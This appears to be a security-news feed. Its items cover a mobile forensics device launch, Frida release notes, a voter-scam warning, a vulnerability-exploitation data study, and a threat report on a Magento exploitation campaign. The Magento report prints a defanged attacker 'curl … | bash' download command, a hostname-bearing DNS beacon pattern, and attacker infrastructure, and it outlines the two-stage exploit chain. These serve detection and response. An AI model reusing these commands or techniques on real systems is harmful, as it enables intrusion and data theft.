items.title: New ways to scale investigations with Graykey Fastrak

items.title: Magnet Graykey 2: Expanding the capabilities of mobile investigations
items.summary: Key takeaways: The new Graykey 2 delivers significantly faster workflows and improved performance. New licensing options make it easier to scale mobile forensics across an agency. Graykey 2 expands investigative flexibility in both the lab and the field. We are thrilled to announce that Magnet Graykey 2, the next generation of our mobile hardware, is now available — helping labs expand mobile access capacity and deliver critical evidence to investigators faster. As mobile data continues to grow in volume and scale, labs need greater capacity to meet demand. Magnet Graykey 2 enables faster, more efficient workflows and gives labs more ways to scale their mobile capabilities — helping teams keep pace with the mobile evidence in their investigations. See what’s new in Graykey 2 below. Get to critical mobile evidence faster Graykey 2 is a full hardware refresh, providing up to 5x faster extraction speeds compared with the previous generation of Graykey* helping your lab quickly access the iOS and Android evidence needed to close more cases. In addition to the increased speed of extraction the new Graykey hardware also features: Upgraded processor and memory for faster boot, faster imaging, and faster extractions. Longer, modern cables and updated USB 3 ports for added ease of use in a range of different lab configurations. Improved networking speed for rapid data transfer over Wi-Fi and faster software updates to the latest capabilities. Updated hardware design for added performance and longevity as well as seamless hardware updates or replacement. Want to see more on the Graykey 2 improvements and the impact they can have to your lab? Join Chris Vance on November 18 as he takes a closer look at the performance improvements of the new Graykey and shares some insights on the impact the added speed and efficiency can bring to your lab. Move devices to your workstation for simultaneous extraction, freeing up your Graykey to gain access to additional devices. Graykey Fastrak can now be used as an online credit pack or added to Premier licenses for unlimited Fastrak extractions. items.title: Maple Networks Highlights AI Data Security Risks at International Cyber Expo 2026
items.summary: As the industry continues to embrace artificial intelligence, questions are being raised about how much visibility and control they have over the information employees are sharing with AI tools. Speaking to IT Security Guru at International Cyber Expo 2026, Graham Tetley, CTO at Maple Networks , explained that AI security and data loss prevention were among the biggest concerns raised by visitors to the company’s stand. Many organisations have already introduced AI tools or allowed employees to use them, but are now trying to understand how those technologies are being used and what information could potentially be exposed. For Graham one of the biggest risks comes from employees accidentally sharing sensitive business information with AI platforms. While malicious activity remains a concern, he believes organisations also need to pay closer attention to human error, particularly when employees may not fully understand the implications of entering company data into AI systems. During the interview, Graham also discussed how Maple Networks is helping organisations gain greater visibility of their security environments through its 24/7 Security Operations Centre (SOC) services. The UK-based cybersecurity provider works with public and private sector organisations, offering continuous security monitoring alongside penetration testing services delivered by CREST-accredited testers and Penetration Testing as a Service (PTaaS). As AI adoption continues to accelerate, Graham believes understanding how employees interact with these tools and preventing unintended data exposure will remain important priorities for security teams. Watch the full interview to hear Graham Tetley discuss the cybersecurity challenges organisations are facing, the risks associated with AI adoption and how Maple Networks is helping businesses strengthen their security.

items.title: Frida 17.25.2 Released
items.summary: More mapper fallout on Android, this time on x86_64, tracked down by @leonitousconforti , two GumJS fixes from @esauvisky , and Idun fixes from @hsorbo and @miikaoskari for those upgrading from an earlier Frida or using an older iPhone. Android Leo found that 17.25.1 crashed on attach on x86_64 Android, one page past dladdr() in libdl.so. The heuristic we introduced in that release for picking a library’s base starts a new candidate at every mapping with file offset zero and prefers executable ones, which breaks libraries whose code shares the first file page with their headers, as libdl.so does there: the code mapping was picked as the base, one page too high. The mapper now uses the library’s own ELF layout instead, accepting a mapping at file offset zero as the base only if the code segments are mapped executable where the linker would have put them. That also rejects stray mappings of the file, so the special case for Android’s libc is gone. He also found that with a native bridge, the arm64 guest libraries may be mapped before the x86_64 host ones, and since the mapper looked up dependencies by basename, the x86_64 agent got bound to the guest libc. It now only accepts libraries whose machine and pointer size match the agent. Thanks for the precise reports! GumJS Emi found that bytecode produced through compile_script() still carried the source. Since QuickJS bytecode version 5, the serializer includes each function’s source slice unless source stripping is enabled on the runtime, so nested function bodies were duplicated throughout the blob. The compile task now strips the source, matching what we did for the prebuilt runtime in 17.24.3. They also found a window where Script._derefWeak() could resurrect a half-freed object. QuickJS sweeps dead weak references when the scope exits, so a target collected mid-scope lingers in our callback table with its children already freed, and dereferencing it then duplicated the dead value. Dead targets now return undefined right away. Thanks! Idun Håvard found that upgrading to 17.25 made paired devices ask to pair again. Idun’s device monitor created its pairing store eagerly, which generated and persisted a fresh host identity under ~/.config/idun even for clients using idund , where the store is never used. That also defeated Frida’s migration of pre-Idun pairing records, which skips when the Idun config directory already exists. The store is now created only on the in-process path that uses it. Thanks! Miika got Frida working against an iPhone SE on iOS 15.8.8 from Ubuntu. On devices predating CoreDevice, the tunnel lookup reported NOT_SUPPORTED as an error rather than falling back to USB, resulting in a misleading complaint about a missing Developer Disk Image. And on Linux, the OpenSSL GIO backend was never registered, so loading a TLS certificate from PEM failed. Thanks! Enjoy! Changelog linux: Find module bases using the ELF layout in the mapper, fixing a crash on x86_64 Android. Thanks @leonitousconforti ! linux: Skip libraries of a foreign ABI in the mapper, fixing a crash on x86_64 Android with a native bridge. Thanks @leonitousconforti ! gumjs: Strip source in bytecode produced by compile_script() . Thanks @esauvisky ! gumjs: Return undefined from Script._derefWeak() for targets already collected. Thanks @esauvisky ! idun: Only create the pairing store when needed, fixing the migration of pairing records from earlier Frida versions. Thanks @hsorbo ! idun: Fall back to USB for devices predating CoreDevice. Thanks @miikaoskari ! idun: Register the OpenSSL GIO backend on Linux. Thanks @miikaoskari !
items.summary_html:
More mapper fallout on Android, this time on x86_64, tracked down by @leonitousconforti, two GumJS fixes from @esauvisky, and Idun fixes from @hsorbo and @miikaoskari for those upgrading from an earlier Frida or using an older iPhone.

Android

Leo found that 17.25.1 crashed on attach on x86_64 Android, one page past dladdr() in libdl.so. The heuristic we introduced in that release for picking a library’s base starts a new candidate at every mapping with file offset zero and prefers executable ones, which breaks libraries whose code shares the first file page with their headers, as libdl.so does there: the code mapping was picked as the base, one page too high. The mapper now uses the library’s own ELF layout instead, accepting a mapping at file offset zero as the base only if the code segments are mapped executable where the linker would have put them. That also rejects stray mappings of the file, so the special case for Android’s libc is gone.

He also found that with a native bridge, the arm64 guest libraries may be mapped before the x86_64 host ones, and since the mapper looked up dependencies by basename, the x86_64 agent got bound to the guest libc. It now only accepts libraries whose machine and pointer size match the agent. Thanks for the precise reports!

GumJS

Emi found that bytecode produced through compile_script() still carried the source. Since QuickJS bytecode version 5, the serializer includes each function’s source slice unless source stripping is enabled on the runtime, so nested function bodies were duplicated throughout the blob. The compile task now strips the source, matching what we did for the prebuilt runtime in 17.24.3.

They also found a window where Script._derefWeak() could resurrect a half-freed object. QuickJS sweeps dead weak references when the scope exits, so a target collected mid-scope lingers in our callback table with its children already freed, and dereferencing it then duplicated the dead value. Dead targets now return undefined right away. Thanks!

Idun

Håvard found that upgrading to 17.25 made paired devices ask to pair again. Idun’s device monitor created its pairing store eagerly, which generated and persisted a fresh host identity under ~/.config/idun even for clients using idund, where the store is never used. That also defeated Frida’s migration of pre-Idun pairing records, which skips when the Idun config directory already exists. The store is now created only on the in-process path that uses it. Thanks!

Miika got Frida working against an iPhone SE on iOS 15.8.8 from Ubuntu. On devices predating CoreDevice, the tunnel lookup reported NOT_SUPPORTED as an error rather than falling back to USB, resulting in a misleading complaint about a missing Developer Disk Image. And on Linux, the OpenSSL GIO backend was never registered, so loading a TLS certificate from PEM failed. Thanks!

Enjoy!

Changelog
  • linux: Find module bases using the ELF layout in the mapper, fixing a crash on x86_64 Android. Thanks @leonitousconforti!
  • linux: Skip libraries of a foreign ABI in the mapper, fixing a crash on x86_64 Android with a native bridge. Thanks @leonitousconforti!
  • gumjs: Strip source in bytecode produced by compile_script(). Thanks @esauvisky!
  • gumjs: Return undefined from Script._derefWeak() for targets already collected. Thanks @esauvisky!
  • idun: Only create the pairing store when needed, fixing the migration of pairing records from earlier Frida versions. Thanks @hsorbo!
  • idun: Fall back to USB for devices predating CoreDevice. Thanks @miikaoskari!
  • idun: Register the OpenSSL GIO backend on Linux. Thanks @miikaoskari!

items.title: Quickpost: Rad Pro
items.summary: While researching the inner workings of Geiger-Müller counters, I stumbled upon Rad Pro . It’s an open-source project developing firmware for cheap GM meters. You get yourself a GM meter and replace its firmware with Rad Pro. For some meters (like FNIRSI), it’s as simple as mounting the meter as a USB storage device and copying the Rad Pro firmware to it. Others (like Bosean) require a programmer. Quickpost info

items.title: Warning: Scammers Are Targeting Voters Ahead of Election Day
items.summary: Scammers continue to target voters ahead of the U.S. midterm elections, Malwarebytes reports. The scams arrive via text message, email, or phone call, offering to help users register to vote, asking them to take a survey, or soliciting donations. The scams are designed to steal money, personal information, or credentials.

items.title: StyleSmuggler Exploitation Deploys PSK Agent RAT Against Magento Stores
items.summary: TL;DR: Between September 9 and September 13, 2026, we detected a coordinated campaign exploiting Magento and Adobe Commerce stores across Western Europe, North America, and the Asia-Pacific region. The activity used /paypal/transparent/response/, an endpoint tied directly to StyleSmuggler (CVE-2026-75650). Malware recovered from the delivery infrastructure reveals a multi-stage chain that installs a shell-script dropper, a remote access trojan (RAT) we track as PSK Agent, and, in some cases, a full-featured PHP webshell. At the time of analysis, the script had a 0% detection rate on VirusTotal. This payload family differs from the Rust backdoor documented in initial StyleSmuggler research, reinforcing that multiple operators are using the same vulnerability to deliver distinct post-exploitation toolkits. Chinese-language comments in the dropper and several infrastructure clues support an assessment that the PSK Agent operator is likely Chinese-speaking, although the evidence does not support attribution to a named threat group. Campaign Overview We tracked five attack clusters originating from a small set of source IP addresses (see IOCs), all targeting the same Magento endpoint with nearly identical PHP payloads. The consistency of the requests indicates automated tooling designed to scan for and exploit vulnerable stores at scale. The attackers relied on a stable delivery path rather than frequently rotating infrastructure. The URL http://transfer[.]chinow[.]abrdns[.]com/get/psk_agent.sh appeared 96 times across 12 payload variants. Four source IPs generated most of the traffic: 132[.]243[.]238[.]178 86[.]107[.]100[.]105 185[.]18[.]222[.]13 64[.]204[.]130[.]9 Their geographic distribution suggests compromised systems or rented infrastructure rather than a single operator-controlled network. The spread of targeted industries and countries is consistent with opportunistic scanning of internet-exposed Magento installations rather than a campaign limited to one country or sector. StyleSmuggler Exploitation Chain The campaign’s use of /paypal/transparent/response/ closely matches the first stage of StyleSmuggler, tracked as CVE-2026-75650 . StyleSmuggler is a two-stage attack against Magento’s template processing. In the first stage, the attacker places PHP source in the query string of /paypal/transparent/response/. Magento raises an error and writes the request, including the malicious query string, to a report file under var/report/. A second request to /graphql uses attacker-controlled styles parameters to load the poisoned report file and evaluate the embedded PHP. Later variants can point the same gadget chain at writable Magento log files. This exploitation of an internet-facing Magento application maps to Exploit Public-Facing Application (T1190) . For more information about StyleSmuggler, see our previous blog . The PHP payloads we observed then use multiple command-execution functions to retrieve PSK Agent. The representative sample attempts shell_exec, system, and exec in sequence; other recovered variants add passthru. If one function is disabled, the payload silently tries the next. Error suppression and output buffering reduce visible failures and capture command output. curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash The curl flags suppress progress and HTTP errors, follow redirects, and pipe the response directly into bash. This avoids writing the initial command payload to disk, although the downloaded script subsequently installs persistent components. The retrieval of the script maps to Ingress Tool Transfer (T1105) , while piping it into bash maps to Command and Scripting Interpreter: Unix Shell (T1059.004) . From Dropper to Persistent Access After exploiting Magento, the attackers used a compact shell script called psk_agent.sh to establish a more durable foothold. The 3,313-byte POSIX script (see IOCs) is designed to work across a range of Linux environments, including hosts where some common utilities or execution paths are unavailable. Its execution through a POSIX shell is another example of Command and Scripting Interpreter: Unix Shell (T1059.004) . The script first searches locations such as $HOME, /tmp, /var/tmp, and /dev/shm for a directory that is both writable and executable. It then attempts to retrieve the next-stage payload using several methods, including curl, wget, Python 2, and Python 3, mapping to Ingress Tool Transfer (T1105) . Once downloaded, the payload is moved into place and launched in the background using setsid or nohup, with its output suppressed. That payload, chi_down, is a 10.5 MB, 64-bit Go binary (see IOCs). Its code has been heavily obfuscated and its build information removed, behavior that maps to Obfuscated Files or Information (T1027) . However, the recovered capabilities reveal a flexible remote-access tool rather than a single-purpose cryptominer. chi_down allows the operator to execute shell commands, collect information about the infected host, proxy traffic through SOCKS5, and communicate over HTTP, HTTPS, and encrypted application-layer channels. Its SOCKS5 functionality maps to Proxy (T1090) , while its encrypted communications map to Encrypted Channel (T1573) . It launches with the arguments -checkagent=false -maintain=true; combined with its scheduling functions and observed persistence artifacts, this suggests the malware is intended to preserve access after the original Magento process ends or the server restarts. This scheduling behavior maps to Scheduled Task/Job (T1053) . Related StyleSmuggler activity has also disguised malicious processes using names such as [kworker/u:8:0], fc-cache, and chronyd, helping them blend into ordinary Linux process listings. This use of system-like process names maps to Masquerading: Match Legitimate Resource Name or Location (T1036.005) . Infrastructure associated with the broader toolkit includes ntp[.]timesync[.]to, which resolved to 185[.]157[.]160[.]251 and carried NTP-like traffic over UDP port 123, and windwsecurity[.]run over TCP port 443. Tracking Successful Exploitation Through DNS Exfiltration Some PHP payloads included a mechanism for reporting successful execution back to the operator. After running on a Magento server, the payload normalized the victim’s hostname and embedded it in a unique subdomain using the following pattern: {victim-hostname}.cmd{hex}[.]0f851bdc9d[.]ddns[.]1433[.]eu[.]org The payload then initiated both an HTTP request and a DNS lookup. Because the attacker controlled the authoritative DNS infrastructure, the lookup alone could confirm that code execution had succeeded—even if the HTTP connection was blocked or failed. This use of DNS for victim success beaconing maps to Application Layer Protocol: Domain Name System (T1071.004) . It gave the operator a near-real-time inventory of compromised hosts through outbound DNS traffic that could appear less conspicuous than a conventional callback. A Webshell as a Second Access Path In a subset of attacks, the operators established an additional foothold by downloading t4.php from transfer[.]onlypsk[.]abrdns[.]com. This payload transfer maps to Ingress Tool Transfer (T1105) . The file was written as zer4.php in publicly reachable Magento directories, including pub/media/. The recovered zer4.php sample is a 910-line PHP file manager and webshell (see IOCs). It allows the operator to browse and modify files, upload or download content, evaluate PHP code, and execute operating-system commands. Its deployment for persistent access maps to Server Software Component: Web Shell (T1505.003) . To improve reliability, the webshell cycles through several command-execution methods. One of the more notable uses PHP’s Foreign Function Interface to call functions in libc directly, potentially preserving command execution when commonly abused PHP functions have been disabled. TL;DR: Between September 9 and September 13, 2026, we detected a coordinated campaign exploiting Magento and Adobe Commerce stores across Western Europe, North America, and the Asia-Pacific region. The activity used /paypal/transparent/response/, an endpoint tied directly to StyleSmuggler (CVE-2026-75650). Malware recovered from the delivery infrastructure reveals a multi-stage chain that installs a shell-script dropper, a remote access trojan (RAT) we track as PSK Agent, and, in some cases, a full-featured PHP webshell. At the time of analysis, the script had a 0% detection rate on VirusTotal. This payload family differs from the Rust backdoor documented in initial StyleSmuggler research, reinforcing that multiple operators are using the same vulnerability to deliver distinct post-exploitation toolkits. Chinese-language comments in the dropper and several infrastructure clues support an assessment that the PSK Agent operator is likely Chinese-speaking, although the evidence does not support attribution to a named threat group.

Campaign Overview

We tracked five attack clusters originating from a small set of source IP addresses (see IOCs), all targeting the same Magento endpoint with nearly identical PHP payloads. The consistency of the requests indicates automated tooling designed to scan for and exploit vulnerable stores at scale.

The attackers relied on a stable delivery path rather than frequently rotating infrastructure. The URL http://transfer[.]chinow[.]abrdns[.]com/get/psk_agent.sh appeared 96 times across 12 payload variants. Four source IPs generated most of the traffic:

  • 132[.]243[.]238[.]178
  • 86[.]107[.]100[.]105
  • 185[.]18[.]222[.]13
  • 64[.]204[.]130[.]9

Their geographic distribution suggests compromised systems or rented infrastructure rather than a single operator-controlled network.

The spread of targeted industries and countries is consistent with opportunistic scanning of internet-exposed Magento installations rather than a campaign limited to one country or sector.

StyleSmuggler Exploitation Chain 

The campaign’s use of /paypal/transparent/response/ closely matches the first stage of StyleSmuggler, tracked as CVE-2026-75650. StyleSmuggler is a two-stage attack against Magento’s template processing. In the first stage, the attacker places PHP source in the query string of /paypal/transparent/response/. Magento raises an error and writes the request, including the malicious query string, to a report file under var/report/. A second request to /graphql uses attacker-controlled styles parameters to load the poisoned report file and evaluate the embedded PHP. Later variants can point the same gadget chain at writable Magento log files. This exploitation of an internet-facing Magento application maps to Exploit Public-Facing Application (T1190). For more information about StyleSmuggler, see our previous blog. 

The PHP payloads we observed then use multiple command-execution functions to retrieve PSK Agent. The representative sample attempts shell_exec, system, and exec in sequence; other recovered variants add passthru. If one function is disabled, the payload silently tries the next. Error suppression and output buffering reduce visible failures and capture command output. 

curl -fsSL hxxp[:]//transfer[.]chinow[.]abrdns[.]com/get/psk_agent[.]sh | bash 

The curl flags suppress progress and HTTP errors, follow redirects, and pipe the response directly into bash. This avoids writing the initial command payload to disk, although the downloaded script subsequently installs persistent components. The retrieval of the script maps to Ingress Tool Transfer (T1105), while piping it into bash maps to Command and Scripting Interpreter: Unix Shell (T1059.004). 

From Dropper to Persistent Access 

After exploiting Magento, the attackers used a compact shell script called psk_agent.sh to establish a more durable foothold. The 3,313-byte POSIX script (see IOCs) is designed to work across a range of Linux environments, including hosts where some common utilities or execution paths are unavailable. Its execution through a POSIX shell is another example of Command and Scripting Interpreter: Unix Shell (T1059.004). 

The script first searches locations such as $HOME, /tmp, /var/tmp, and /dev/shm for a directory that is both writable and executable. It then attempts to retrieve the next-stage payload using several methods, including curl, wget, Python 2, and Python 3, mapping to Ingress Tool Transfer (T1105). Once downloaded, the payload is moved into place and launched in the background using setsid or nohup, with its output suppressed. 

That payload, chi_down, is a 10.5 MB, 64-bit Go binary (see IOCs). Its code has been heavily obfuscated and its build information removed, behavior that maps to Obfuscated Files or Information (T1027). However, the recovered capabilities reveal a flexible remote-access tool rather than a single-purpose cryptominer. 

chi_down allows the operator to execute shell commands, collect information about the infected host, proxy traffic through SOCKS5, and communicate over HTTP, HTTPS, and encrypted application-layer channels. Its SOCKS5 functionality maps to Proxy (T1090), while its encrypted communications map to Encrypted Channel (T1573). It launches with the arguments -checkagent=false -maintain=true; combined with its scheduling functions and observed persistence artifacts, this suggests the malware is intended to preserve access after the original Magento process ends or the server restarts. This scheduling behavior maps to Scheduled Task/Job (T1053). 

Related StyleSmuggler activity has also disguised malicious processes using names such as [kworker/u:8:0], fc-cache, and chronyd, helping them blend into ordinary Linux process listings. This use of system-like process names maps to Masquerading: Match Legitimate Resource Name or Location (T1036.005). Infrastructure associated with the broader toolkit includes ntp[.]timesync[.]to, which resolved to 185[.]157[.]160[.]251 and carried NTP-like traffic over UDP port 123, and windwsecurity[.]run over TCP port 443. 

Tracking Successful Exploitation Through DNS Exfiltration 

Some PHP payloads included a mechanism for reporting successful execution back to the operator. After running on a Magento server, the payload normalized the victim’s hostname and embedded it in a unique subdomain using the following pattern: 

{victim-hostname}.cmd{hex}[.]0f851bdc9d[.]ddns[.]1433[.]eu[.]org 

The payload then initiated both an HTTP request and a DNS lookup. Because the attacker controlled the authoritative DNS infrastructure, the lookup alone could confirm that code execution had succeeded—even if the HTTP connection was blocked or failed. This use of DNS for victim success beaconing maps to Application Layer Protocol: Domain Name System (T1071.004). It gave the operator a near-real-time inventory of compromised hosts through outbound DNS traffic that could appear less conspicuous than a conventional callback. 

A Webshell as a Second Access Path 

In a subset of attacks, the operators established an additional foothold by downloading t4.php from transfer[.]onlypsk[.]abrdns[.]com. This payload transfer maps to Ingress Tool Transfer (T1105). The file was written as zer4.php in publicly reachable Magento directories, including pub/media/. 

The recovered zer4.php sample is a 910-line PHP file manager and webshell (see IOCs). It allows the operator to browse and modify files, upload or download content, evaluate PHP code, and execute operating-system commands. Its deployment for persistent access maps to Server Software Component: Web Shell (T1505.003). 

To improve reliability, the webshell cycles through several command-execution methods. One of the more notable uses PHP’s Foreign Function Interface to call functions in libc directly, potentially preserving command execution when commonly abused PHP functions have been disabled. Commands are protected with AES-256-CBC encryption, mapping to Encrypted Channel (T1573), and the same hardcoded key appeared across recovered samples, linking the webshells to a shared operator or centrally distributed toolset. 

Together, psk_agent.sh, chi_down, DNS-based victim tracking, and zer4.php show a campaign designed to do more than exploit Magento servers once. The operators built multiple paths for confirming compromise, maintaining access, and continuing to control affected systems after the initial StyleSmuggler intrusion.  

Attribution Assessment 

The strongest attribution clue appears inside psk_agent.sh. The script retains Chinese-language comments that translate to ‘configuration area’ and ‘automatically find a writable and executable directory.’ Native-language development comments can indicate the language used by the malware author, particularly when they appear alongside operator-selected names such as chinow and chi_down. 

The delivery infrastructure also uses chinow[.]abrdns[.]com and onlypsk[.]abrdns[.]com. These names, the Chinese comments, and the consistent PSK naming support an assessment that the developer or operator is likely Chinese-speaking. However, language artifacts can be planted or inherited through reused code, and infrastructure naming alone is not definitive. We therefore assess a likely Chinese-speaking nexus with moderate confidence but do not attribute the campaign to a specific group, organization, or government. 

This attribution applies to the PSK Agent activity described here, not to all StyleSmuggler exploitation. Researchers have documented multiple attackers and distinct payload families using CVE-2026-75650, including a Rust backdoor and separate PHP droppers. The vulnerability is now a shared access vector rather than the signature of any single actor. 

Detection and Response 

Applying Adobe’s VULN-39341 hotfix closes the initial StyleSmuggler entry point, but it does not remove a RAT, webshell, stolen credentials, or other persistence established before patching. Systems with any campaign indicator should be treated as potentially fully compromised and investigated accordingly. 

  • Patch CVE-2026-75650. Apply Adobe’s VULN-39341 hotfix and verify that it is installed. Unsupported Magento branches require vendor-supported remediation or migration planning.
  • Hunt for the dropper and RAT. Search writable and executable locations for psk_agent.sh and chi_down, inspect cron and systemd persistence, and validate processes masquerading as kworker, fc-cache, or chronyd.
  • Hunt for PHP webshells. Review pub/media/ and the Magento root for unexpected PHP files, zer4.php, and SSP_*.txt or ssp_*.txt output files.
  • Monitor DNS and egress. Alert on lookups beneath 0f851bdc9d.ddns.1433.eu.org and on web-server processes connecting to dynamic DNS domains or initiating unexpected outbound HTTP, HTTPS, or UDP/123 traffic.
  • Rotate exposed secrets. If compromise is suspected, rotate the Magento encryption key, database credentials, administrative credentials, integration tokens, payment-gateway secrets, SSH keys, and other values accessible to the web-server account.
  • Block campaign infrastructure. Block the indicators below at DNS, network, web application firewall, and endpoint controls where appropriate, while recognizing that infrastructure can change quickly. 
Conclusion 

StyleSmuggler became a shared access vector within days of disclosure. The PSK Agent campaign used it to deliver a shell-script dropper, Go RAT, DNS tracking mechanism, and PHP webshell, enabling persistent access, command execution, traffic proxying, and further compromise. 

The dropper’s 0% VirusTotal detection rate shows why file reputation alone is insufficient. Detection should focus on the full chain: StyleSmuggler endpoint requests, web-server processes spawning shells, outbound traffic to campaign infrastructure, hostname-bearing DNS beacons, new PHP files in public media directories, and unexplained persistence. Patching prevents new exploitation; affected systems require full incident response.

items.title: What exploited vulnerabilities have in common: A data-driven analysis of real-world attacks
items.summary: In this article Classifying the vulnerability landscape Vulnerabilities exploited in the wild Where defenders should focus Patching is slow, while exploitation is fast Impact, exposure and where to focus Next in line How Microsoft Security helps defenders act References Learn More The vulnerability landscape continues to expand. From 1999 through September 2026, approximately 383,000 software vulnerabilities had been disclosed across platforms and technologies, yet only about 2,000 CVEs (roughly 0.5%) have been linked to real-world exploitation. Those vulnerabilities follow clear patterns. Threat actors disproportionately target flaws that enable system takeover, particularly remote code execution, privilege escalation, and authentication bypass. AI-assisted vulnerability discovery and exploit development could further shorten the window defenders have to respond. Patching remains essential, but remediation can take weeks or months on critical systems, and some legacy or unsupported systems cannot be patched. Defenders therefore need to concentrate protection where it can have the greatest impact, considering both the likelihood of exploitation and the potential blast radius of a successful attack. Classifying the vulnerability landscape To make this large vulnerability population actionable, we analyzed each CVE across two dimensions: impact class and affected platform. Impact class captures the outcome a threat actor could achieve by exploiting a vulnerability. Each CVE is assigned to the most consequential impact it directly enables. For example, when a vulnerability can bypass authentication and directly enable remote code execution (RCE), we classify it as RCE. This approach helps distinguish the underlying type of vulnerability from the security impact an attacker could achieve. Server-side RCE: Remote code execution on a network-exposed service without user interaction. Client-side RCE: Remote code execution that requires a user to open or run malicious content. Local code execution: Code or command execution requiring local access or an existing foothold. Local privilege escalation: Elevation from lower-level access to SYSTEM or root privileges. Authentication or authorization bypass: Circumvention of authentication or access controls. Security-control bypass: Circumvention of protections such as sandboxing, secure boot, or SmartScreen. Information disclosure: Exposure of sensitive data or secrets. Tampering or integrity: Unauthorized modification of data or system state. Denial of service: Disruption of system or service availability. Cross-site scripting (XSS): Script execution within a victim’s browser context. Arbitrary file access: Unauthorized access to or placement of files. Spoofing or redirect: Spoofing, redirection, or other forms of UI deception. We also classified vulnerabilities by the platforms they affect, including Windows, Linux/Unix, mobile, network appliances, IoT/OT, virtualization hosts, and developer packages. A CVE can span multiple platforms. Developer packages are treated as a separate category because they are often cross-platform and represent a significant share of the overall vulnerability population. Most CVEs in the analysis affect application code, including servers, web applications, browsers, productivity software, libraries, and firmware tooling, while a smaller share affects OS and system code such as kernels, drivers, and firmware. This analysis covers CVEs published through September 2026 using Microsoft’s catalog of tracked vulnerabilities. Each CVE is counted once in the impact analysis and across each relevant platform in the platform analysis. Figure 1 – The full published-CVE population as of September 2026, broken down by impact class and affected platform, and an OS vs. application split. Breadth dominates – many impact classes spread across many platforms, with about 77% of CVEs in application code and 23% in OS/system code. Vulnerabilities exploited in the wild The subset of vulnerabilities exploited in the wild is much smaller than the overall CVE population, and looks very different from it. Fewer than 1 in 200 published CVEs are ever used in a real attack, and those that do get used are overwhelmingly concentrated in the takeover classes that maximize threat actor impact and exposure. The difference becomes clear when we look at impact. Exploitation is heavily concentrated in vulnerabilities that give attackers greater control over a system. Server-side RCE rises from 20% of published CVEs to 37% of exploited CVEs, local privilege escalation from 11% to 18%, and client-side RCE from 4% to 13%. By comparison, XSS falls from 15% to 4% and denial of service from 16% to 7%. OS vulnerabilities show a similar shift, increasing from 23% of the overall CVE population to 41% of exploited vulnerabilities. These patterns are consistent with threat actors favoring vulnerabilities that can provide meaningful access and control. Remote code execution and privilege escalation can create footholds that support subsequent stages of an attack, while vulnerabilities that primarily cause a crash or limited script execution may offer less utility for broader compromise. Importantly, a vulnerability’s stated classification does not always reflect what an attacker can reliably achieve in practice. For example, some vulnerabilities described as enabling RCE may ultimately result only in denial of service under real-world conditions. Understanding the demonstrated impact and exploitability of a vulnerability is therefore critical to effective prioritization. Figure 2 – The 2,056 exploited-in-the-wild CVEs distribution, compared against the full published population: ghost lines mark each class and platform’s share of all ~380K published CVEs, and badges show the shift in percentage points. Takeover classes and OS code rise, while high-volume XSS and DoS fall. Where defenders should focus Patching is slow, while exploitation is fast Patching is slow, and far slower on critical systems than others. Across platforms, servers are the critical assets and the slowest to patch. Microsoft Security Exposure Management data from 2026 shows that the median vulnerability is patched in about two weeks on Windows workstations but in more than a month on Windows Servers. It stretches to 10+ weeks on Linux Servers and for applications running on MacOS, and beyond a year on network appliances. That gap is the threat actor’s window, widest on the critical systems that stay exposed the longest. Exploitation runs on the opposite clock: the most impactful vulnerabilities are weaponized in days, increasingly on or before disclosure. According to VulnCheck , 29% of the exploits in 2025 were launched within 1 day of CVE publication. According to CISA, the mean time from CVE publication to CISA KEV catalog fell from 89 days in 2024 to 57 days in 2025. 2026 data up to September already have that number dropping to 20 days, with a median of only 3 days since publication. Industry research suggests that advances in AI are a significant factor in the time reduction required to develop exploits, further increasing pressure on defenders to respond quickly. Impact, exposure and where to focus Two things determine a vulnerability’s value to a threat actor: impact and exposure. Impact is what successful exploitation provides, such as remote code execution or privilege escalation. Exposure is an asset’s position in the environment and the opportunities it creates for further compromise. An asset’s exposure is shaped by the identities, privileges, and connections available from it. Servers often use service accounts, application identities, or cloud-managed identities with permissions beyond their operational needs. Compromising such a system can provide access to additional resources, sensitive data, administrative privileges, or trusted network paths. Together, impact and exposure determine the blast radius: a vulnerability that enables full control of a highly exposed system can enable widespread on-premises or cloud compromise. Threat actors do not exploit at random: they go after the vulnerabilities that give the highest impact and exposure: full control of a system and the privileged identities and critical assets it has access to. As defenders, focusing on these vulnerabilities first can deliver the highest return on remediation investment. Takeover vulnerabilities like remote code execution, authentication bypass and local privilege escalation lead here. They drive the broadest exposure and the largest blast radius, account for 78% of real-world exploited vulnerabilities, and stopping their exploitation interrupts attacks at the earliest stage, before compromise can propagate across the environment. Next in line A second slice deserves attention where context makes it severe: denial of service against availability-critical assets is recoverable in general, but can be mission-ending in parts of your environment where uptime is everything; disclosure of credentials or secrets can be minor as an insulated incident, but it feeds the same privileged-identity path mentioned above. Figure 3 – The three remote-takeover classes analyzed across 1,239 exploited CVEs), each drilled down by affected platform and split into OS vs Application code. Bar length is the CVE count per platform; the dark segment is OS/system, the light segment is application. How Microsoft Security helps defenders act Threat actors do not begin with a vulnerability list. They begin by looking for a reachable way in. Microsoft Defender External Attack Surface Management approaches the environment from that same outside-in perspective, continuously discovering internet-facing infrastructure, including previously unknown or unmonitored assets, shadow IT, and third-party dependencies. This gives defenders an opportunity to remove unnecessary exposure before a reachable vulnerability becomes an entry point. Once the reachable assets are known, the next question is which weaknesses deserve immediate attention. Defenders need a way to prioritize exposure beyond CVSS alone. Microsoft Defender Vulnerability Management addresses this challenge through Exposure Score and prioritized security recommendations . Prioritization incorporates threat and exploitability signals, breach likelihood, internet exposure, and asset criticality, helping teams focus remediation on vulnerabilities that create the greatest actual exposure. An initial foothold is only part of the risk. Attack Path Analysis connects assets and threat actor techniques into end-to-end routes from an entry point to a critical asset. Microsoft Security Exposure Management Attack Path Analysis provides a cross-workload view spanning endpoints, cloud, and hybrid environments, using vulnerability context from MDVM, endpoint data from Defender for Endpoint, and cloud asset data from Defender for Cloud. Within cloud environments, Defender CSPM Attack Path Analysis adds detailed context about internet exposure, vulnerabilities, network connections, identities, and permissions across Azure, AWS, and Google Cloud. Together, these experiences show how an exposed workload could become a path through a privileged identity to sensitive data or another critical resource, helping defenders identify where to break the path before the initial compromise expands. Patching remains essential, but it is not the only defensive action available. Microsoft Security helps defenders discover the doors threat actors can see, prioritize the weaknesses they are most likely to exploit, understand where a compromise could lead, and identify opportunities to break attack paths before compromise spreads to critical assets. To get notified about new publications and to join discussions on social media, follow us on LinkedIn , X (formerly Twitter) , and Bluesky . Breadth dominates – many impact classes spread across many platforms, with about 77% of CVEs in application code and 23% in OS/system code. Vulnerabilities exploited in the wild

